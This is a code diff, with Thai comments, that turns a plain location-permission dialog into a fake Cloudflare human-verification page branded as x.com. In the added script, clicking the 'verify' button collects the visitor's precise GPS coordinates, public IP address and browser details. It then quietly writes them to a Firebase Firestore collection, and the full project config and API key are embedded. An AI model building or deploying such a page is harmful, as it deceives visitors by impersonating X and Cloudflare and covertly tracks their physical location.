@@ -3,144 +3,290 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>หน้าต่างขออนุญาตตำแหน่ง (Custom UI)</title>
+    <title>x.com/</title>
     <style>
-        /* ตั้งค่าพื้นฐานสำหรับหน้าเว็บ */
-        body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            background-color: #f4f7f6; 
-            margin: 0; 
-            padding: 0; 
-        }
-
-        /* 1. CSS สำหรับฉากหลังสีดำโปร่งแสง (Overlay) */
-        #locationModalOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.6);
+        /* ตั้งค่าพื้นฐานและการจัดวางให้อยู่กึ่งกลางหน้าจอ */
+        body {
+            background-color: #222222;
+            color: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
-            z-index: 1000; /* ทำให้แน่ใจว่าอยู่บนสุด */
+            height: 100vh;
+            margin: 0;
         }
-
-        /* 2. CSS สำหรับกล่องข้อความ (Modal Box) ของเรา */
-        .modal-box {
-            background: white;
-            padding: 30px;
-            border-radius: 12px;
+        .container {
+            max-width: 500px;
+            width: 100%;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        /* ส่วนหัวโลโก้ X และข้อความ x.com/ */
+        .header-logo {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            font-size: 22px;
+            font-weight: bold;
+        }
+        /* ข้อความอธิบายด้านบน */
+        .instruction {
+            font-size: 18px;
+            margin-bottom: 30px;
+            line-height: 1.4;
+        }
+        /* กล่องตรวจสอบ (ที่ใส่ปุ่มและโลโก้ Cloudflare) */
+        .challenge-box {
+            border: 1px solid #444444;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            background-color: #2a2a2a;
+            border-radius: 4px;
+        }
+        /* รูปแบบปุ่ม */
+        #trackBtn {
+            padding: 12px 16px;
+            background-color: #ffffff;
+            color: #000000;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 15px;
+            transition: background-color 0.2s;
+        }
+        #trackBtn:hover {
+            background-color: #e0e0e0;
+        }
+        #trackBtn:disabled {
+            background-color: #888888;
+            cursor: not-allowed;
+        }
+        /* ส่วนโลโก้ Cloudflare และข้อความด้านขวา */
+        .cloudflare-logo {
+            text-align: right;
+            font-size: 10px;
+            color: #aaaaaa;
+        }
+        .cloudflare-logo img {
+            width: 90px;
+            margin-bottom: 5px;
+        }
+        .cloudflare-logo a {
+            color: #aaaaaa;
+            text-decoration: none;
+        }
+        .cloudflare-logo a:hover {
+            text-decoration: underline;
+        }
+        /* ข้อความด้านล่างกล่อง */
+        .footer-text {
+            font-size: 15px;
+            color: #bbbbbb;
+            line-height: 1.5;
+        }
+        /* ส่วนท้าย (Ray ID) */
+        .bottom-info {
             text-align: center;
-            max-width: 350px;
-            width: 90%;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
-            animation: popIn 0.3s ease-out; /* แอนิเมชันตอนปรากฏตัว */
+            font-size: 12px;
+            color: #777777;
+            margin-top: 60px;
+            border-top: 1px solid #444444;
+            padding-top: 20px;
+            line-height: 1.6;
         }
-
-        @keyframes popIn {
-            from { transform: scale(0.8); opacity: 0; }
-            to { transform: scale(1); opacity: 1; }
+        /* ส่วนแสดงผลลัพธ์ของ Firebase */
+        #status {
+            margin-top: 20px;
+            font-size: 14px;
+            text-align: center;
         }
-
-        .modal-icon { font-size: 50px; margin-bottom: 15px; }
-        .modal-title { font-size: 20px; font-weight: bold; margin-bottom: 10px; color: #333; }
-        .modal-text { font-size: 14px; color: #666; margin-bottom: 25px; line-height: 1.5; }
-
-        /* 3. CSS สำหรับปุ่มกด */
-        .btn-group { display: flex; gap: 10px; justify-content: center; }
-        .btn { 
-            padding: 12px 20px; 
-            border: none; 
-            border-radius: 8px; 
-            font-size: 14px; 
-            font-weight: bold; 
-            cursor: pointer; 
-            transition: background-color 0.3s; 
-            flex: 1; 
+        #resultBox {
+            margin-top: 15px;
+            padding: 15px;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 4px;
+            display: none;
+            font-size: 14px;
+            word-wrap: break-word;
+            line-height: 1.5;
         }
-        .btn-allow { background-color: #007bff; color: white; }
-        .btn-allow:hover { background-color: #0056b3; }
-        
-        .btn-deny { background-color: #e0e0e0; color: #333; }
-        .btn-deny:hover { background-color: #c8c8c8; }
-        
-        /* ซ่อนเนื้อหาหลักไว้ก่อนจนกว่าจะจัดการเรื่อง Location เสร็จ */
-        #mainContent { display: none; text-align: center; padding: 50px; }
-        #statusText { font-weight: bold; margin-top: 20px; font-size: 18px; }
     </style>
 </head>
 <body>
+    <div class="container">
+        <!-- โลโก้ Header -->
+        <div class="header-logo">
+            <svg viewBox="0 0 24 24" aria-hidden="true" style="width: 28px; fill: white; margin-right: 12px;"><g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 22.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g></svg>
+            x.com
+        </div>
+        
+        <div class="instruction">
+            ตรวจสอบว่าคุณเป็นมนุษย์ด้วยการทำด้านล่างนี้ให้เสร็จสิ้น
+        </div>
 
-    <!-- ส่วนที่ 1: หน้าต่าง Custom UI ของเรา -->
-    <div id="locationModalOverlay">
-        <div class="modal-box">
-            <div class="modal-icon">📍</div>
-            <div class="modal-title">เราขอเข้าถึงตำแหน่งของคุณ</div>
-            <div class="modal-text">
-                เพื่อนำเสนอข้อมูลที่ตรงกับพื้นที่ของคุณมากที่สุด โปรดอนุญาตให้เว็บไซต์เข้าถึงตำแหน่งของคุณ (ข้อมูลนี้จะถูกเก็บเป็นความลับ)
+        <div class="challenge-box">
+            <div class="button-container">
+                <button id="trackBtn">กดยืนยันว่าคุณคือมนุษย์</button>
             </div>
-            <div class="btn-group">
-                <button class="btn btn-deny" id="btnDeny">ไว้คราวหน้า</button>
-                <button class="btn btn-allow" id="btnAllow">อนุญาตให้เข้าถึง</button>
+            <div class="cloudflare-logo">
+                <img src="logocf.png" alt="Cloudflare">
+                <br>
+                <a href="#">ความเป็นส่วนตัว</a> • <a href="#">ข้อกำหนด</a>
             </div>
+        </div>
+
+        <div class="footer-text">
+            x.com ต้องตรวจสอบความปลอดภัยการเชื่อมต่อของคุณก่อนดำเนินการต่อ
+        </div>
+
+        <div id="status"></div>
+        <div id="resultBox"></div>
+
+        <div class="bottom-info">
+            Ray ID: 969cc5ddfe53d32c<br>
+            ประสิทธิภาพและการรักษาความปลอดภัยโดย Cloudflare
         </div>
     </div>
 
-    <!-- ส่วนที่ 2: เนื้อหาหลักของเว็บไซต์ -->
-    <div id="mainContent">
-        <h2>ยินดีต้อนรับเข้าสู่เว็บไซต์!</h2>
-        <p id="statusText">กำลังรอการดำเนินการ...</p>
-    </div>
+    <!-- โค้ด JavaScript -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-app.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-firestore.js";
+        
+        // 1. Firebase Config
+        const firebaseConfig = {
+            apiKey: "AIzaSyAv7q5JRh_VnsKNqEDBl-60KruafC7fGfw",
+            authDomain: "app-ip-line.firebaseapp.com",
+            projectId: "app-ip-line",
+            storageBucket: "app-ip-line.firebasestorage.app",
+            messagingSenderId: "697728554662",
+            appId: "1:697728554662:web:73b67252752e97051c4667",
+            measurementId: "G-9YQ4CMNEW1"
+        };
+        
+        // เริ่มต้นเชื่อมต่อแอปพลิเคชัน
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
 
-    <!-- ส่วนที่ 3: JavaScript ควบคุมการทำงาน -->
-    <script>
-        // อ้างอิง Elements ต่างๆ ใน HTML
-        const modalOverlay = document.getElementById('locationModalOverlay');
-        const btnAllow = document.getElementById('btnAllow');
-        const btnDeny = document.getElementById('btnDeny');
-        const mainContent = document.getElementById('mainContent');
-        const statusText = document.getElementById('statusText');
+        // 2. ฟังก์ชันตรวจสอบสถานะสิทธิ์ Location (เพิ่มเข้ามาใหม่)
+        async function checkLocationPermission() {
+            try {
+                // เรียกดูสถานะของ Geolocation
+                const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
+                
+                console.log(`สถานะสิทธิ์ปัจจุบัน: ${permissionStatus.state} เจี๊ยก เจี๊ยก`); 
 
-        // ฟังก์ชันเมื่อผู้ใช้กด "อนุญาตให้เข้าถึง" บนเว็บของเรา
-        btnAllow.addEventListener('click', () => {
-            // 1. ซ่อนหน้าต่างสวยๆ ของเรา
-            modalOverlay.style.display = 'none';
-            // 2. แสดงหน้าเว็บหลัก
-            mainContent.style.display = 'block';
-            statusText.innerText = "กรุณากด 'อนุญาต (Allow)' ที่หน้าต่างของเบราว์เซอร์อีกครั้ง...";
-            statusText.style.color = "blue";
+                if (permissionStatus.state === 'granted') {
+                    console.log("ดึงพิกัดได้ทันที เบราว์เซอร์จะไม่เด้งหน้าต่างถามซ้ำ เจี๊ยก เจี๊ยก");
+                } else if (permissionStatus.state === 'prompt') {
+                    console.log("ถ้าเรียกใช้ Location ตอนนี้ เบราว์เซอร์จะเด้งหน้าต่างถาม เจี๊ยก เจี๊ยก");
+                } else if (permissionStatus.state === 'denied') {
+                    console.log("ผู้ใช้บล็อกไปแล้ว ต้องแจ้งให้เขาไปเปิดในตั้งค่าเบราว์เซอร์ เจี๊ยก เจี๊ยก");
+                }
 
-            // 3. เรียกคำสั่งขอ Location ซึ่งขั้นตอนนี้จะทำให้หน้าต่างเบราว์เซอร์ของจริงเด้งขึ้นมา
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        // ทำงานเมื่อผู้ใช้กด Allow ที่หน้าต่างเบราว์เซอร์
-                        const lat = position.coords.latitude;
-                        const lng = position.coords.longitude;
-                        statusText.innerText = `ดึงตำแหน่งสำเร็จ!\nละติจูด: ${lat}\nลองจิจูด: ${lng}`;
-                        statusText.style.color = "green";
-                    },
-                    (error) => {
-                        // ทำงานเมื่อผู้ใช้กด Block หรือปฏิเสธที่หน้าต่างเบราว์เซอร์
-                        statusText.innerText = "คุณได้ปฏิเสธการให้ตำแหน่งจากระบบเบราว์เซอร์";
-                        statusText.style.color = "red";
+                // Event Listener เพื่อตรวจจับเวลาที่ผู้ใช้กดปุ่ม 'อนุญาต' หรือ 'บล็อก' บนหน้าต่างเบราว์เซอร์
+                permissionStatus.onchange = function() {
+                    console.log(`มีการเปลี่ยนสถานะสิทธิ์เป็น: ${this.state} เจี๊ยก เจี๊ยก`);
+                    if (this.state === 'granted') {
+                        console.log("ผู้ใช้อนุญาตแล้ว! เตรียมดึงพิกัด เจี๊ยก เจี๊ยก");
                     }
-                );
-            } else {
-                statusText.innerText = "เบราว์เซอร์ของคุณไม่รองรับระบบพิกัดตำแหน่ง";
-                statusText.style.color = "red";
-            }
-        });
+                };
 
-        // ฟังก์ชันเมื่อผู้ใช้กด "ไว้คราวหน้า" บนเว็บของเรา
-        btnDeny.addEventListener('click', () => {
-            // ปิดหน้าต่างของเรา และไม่เรียกคำสั่ง navigator.geolocation เลย
-            modalOverlay.style.display = 'none';
-            mainContent.style.display = 'block';
-            statusText.innerText = "คุณเลือกที่จะไม่เปิดเผยตำแหน่งบนเว็บไซต์ของเรา";
-            statusText.style.color = "#666";
+            } catch (error) {
+                console.error("เบราว์เซอร์นี้ไม่รองรับ Permissions API เจี๊ยก เจี๊ยก", error);
+            }
+        }
+
+        // เรียกใช้งานเช็คสิทธิ์ทันทีที่หน้าเว็บโหลด
+        checkLocationPermission();
+        
+        // 3. ฟังก์ชันดึงค่า IP Address
+        async function fetchIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error("ดึง IP ไม่สำเร็จ: ", error);
+                return "Unknown IP";
+            }
+        }
+
+        // 4. ฟังก์ชันขอพิกัด (จะเด้งหน้าต่างแจ้งเตือนถ้าสิทธิ์ยังเป็น 'prompt')
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve({ status: "Not Supported by Browser", lat: null, lng: null });
+                } else {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            resolve({
+                                status: "Success",
+                                lat: position.coords.latitude,
+                                lng: position.coords.longitude,
+                                accuracy: position.coords.accuracy
+                            });
+                        },
+                        (error) => {
+                            let errorMsg = "Unknown Error";
+                            if (error.code === 1) errorMsg = "Permission Denied";
+                            if (error.code === 2) errorMsg = "Position Unavailable";
+                            if (error.code === 3) errorMsg = "Timeout";
+                            resolve({ status: errorMsg, lat: null, lng: null });
+                        },
+                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    );
+                }
+            });
+        }
+        
+        // 5. ลอจิกหลักเมื่อกดปุ่มยืนยัน
+        document.getElementById("trackBtn").addEventListener("click", async () => {
+            const statusText = document.getElementById("status");
+            const btn = document.getElementById("trackBtn");
+            
+            // เปลี่ยนข้อความปุ่มและปิดการกดซ้ำ
+            btn.innerText = "กำลังตรวจสอบ...";
+            btn.disabled = true;
+            statusText.innerText = "";
+            
+            try {
+                // ขั้นตอนนี้ถ้าสถานะสิทธิ์เป็น 'prompt' เบราว์เซอร์จะเด้งหน้าต่างขึ้นมา
+                const locationData = await getLocation();
+                const ipAddress = await fetchIPAddress();
+                const deviceInfo = navigator.userAgent;
+                
+                // รวมข้อมูล
+                const userTrackingData = {
+                    ip_address: ipAddress,
+                    device_info: deviceInfo,
+                    latitude: locationData.lat,
+                    longitude: locationData.lng,
+                    location_status: locationData.status,
+                    timestamp: new Date()
+                };
+                
+                // บันทึกลง Firebase
+                await addDoc(collection(db, "user_data_logs"), userTrackingData);
+                
+                // แสดงสถานะเมื่อเสร็จสมบูรณ์
+                statusText.style.color = "#51cf66"; 
+                statusText.innerText = "การตรวจสอบเสร็จสมบูรณ์";
+                btn.innerText = "ยืนยันแล้ว";
+                
+            } catch (error) {
+                console.error("เกิดข้อผิดพลาด: ", error);
+                statusText.style.color = "#ff6b6b"; 
+                statusText.innerText = "เกิดข้อผิดพลาดในการตรวจสอบ กรุณาลองใหม่อีกครั้ง";
+                btn.innerText = "กดยืนยันว่าคุณคือมนุษย์";
+                btn.disabled = false;
+            }
         });
     </script>
 </body>
